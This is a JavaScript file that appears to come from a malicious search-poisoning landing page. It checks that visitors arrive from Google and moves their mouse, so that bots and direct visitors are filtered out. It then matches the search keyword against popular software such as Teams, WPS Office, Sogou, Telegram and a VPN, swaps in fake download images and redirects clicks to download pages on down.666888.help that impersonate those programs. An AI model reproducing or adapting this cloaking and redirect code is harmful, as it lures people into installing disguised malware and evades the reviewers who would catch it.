var numCount=0;
var allowCount=10;
var confArr=[
["helloworld",3,"https://down.666888.help/goo/hw.php",true],
["teams",2,"https://down.666888.help/goo/tearns.php",false],
["yifanyi|易翻译",2,"https://down.666888.help/goo/traneasy.php",false],
["sogou|搜狗|输入法",3,"https://down.666888.help/goo/sogou.php",false],
["wps|office",3,"https://down.666888.help/goo/wps.php",false],
["aicoin",2,"https://down.666888.help/goo/coin.php",false],
["kuailian|快连",3,"https://down.666888.help/goo/letsp.php",false],
["qishui|汽水",1,"https://down.666888.help/goo/soda.php",false],
["telegram|tg|飞机|电报",5,"",false]
];
var notRef=false;
var findObj;
var refs;

$(function()
{
	refs=checkRef();
	const urlParams = new URLSearchParams(window.location.search);
	var kw=urlParams.get("kw");
	if(kw){kw=kw.toLowerCase().replaceAll(" ","");}
	if(kw && refs)
	{
		for(var i=0;i<confArr.length;i++)
		{
			var arrObj=confArr[i];
			var curName=arrObj[0].toLowerCase();
			if(new RegExp(curName).test(kw)==true)
			{
				findObj=confArr[i];
				break;
			}
		}
	}

	$("body").mousemove(function(event)
	{
		if(event.pageX>0 && event.pageY>0 && findObj && refs)
		{
			numCount++;
			if(numCount==allowCount)
			{
				document.title="site";
				if(findObj[3]==true)
				{
					window.location=findObj[2];
				}
				else
				{
					var imgDoms="";
					var sName=findObj[0].split("|")[0];
					for(var i=1;i<=findObj[1];i++)
					{
						imgDoms+="<img src='"+sName+i+".jpg' />";
					}
					$("body").html(imgDoms);
				}
			}
		}
	});

	$("body").click(function(event)
	{
		if(checkRes(event)==true)
		{
			window.location=findObj[2];
		}
	});
})

function checkRes(e)
{
	if(numCount>=allowCount && e.pageX>0 && e.pageY>0 && findObj && refs)
	{return true;}else{return false;}
}

function checkRef()
{
	if(notRef==true)
	{
		return true;
	}
	else
	{
		var refStr=document.referrer;
		if(refStr)
		{
			if(new RegExp("google").test(refStr)==true){return true;}else{return false;}
		}
		else
		{
			return false;
		}
	}
}
